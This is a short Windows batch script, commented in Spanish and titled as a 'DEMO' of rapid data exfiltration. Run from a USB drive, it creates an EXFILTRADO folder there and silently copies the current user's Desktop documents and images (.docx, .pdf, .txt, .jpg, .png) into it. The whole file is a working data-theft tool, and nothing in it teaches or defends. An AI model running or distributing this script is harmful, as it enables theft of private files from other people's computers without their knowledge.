@echo off
title Clonador de Archivos DEMO
echo =========================================
echo   🚨 DEMO: Exfiltracion Rapida de Datos 🚨
echo =========================================
echo.
echo Buscando archivos en el Escritorio...
echo.

:: Detectar letra del USB (donde está corriendo este script)
set usbdrive=%~d0

:: Carpeta destino dentro del USB
set destino=%usbdrive%\EXFILTRADO
if not exist "%destino%" mkdir "%destino%"

:: Copiar documentos del Escritorio
xcopy "%USERPROFILE%\Desktop\*.docx" "%destino%" /s /c /y >nul
xcopy "%USERPROFILE%\Desktop\*.pdf"  "%destino%" /s /c /y >nul
xcopy "%USERPROFILE%\Desktop\*.txt"  "%destino%" /s /c /y >nul
xcopy "%USERPROFILE%\Desktop\*.jpg"  "%destino%" /s /c /y >nul
xcopy "%USERPROFILE%\Desktop\*.png"  "%destino%" /s /c /y >nul

echo Archivos copiados en: %destino%
echo.
echo 🚨 DEMO COMPLETADA 🚨
pause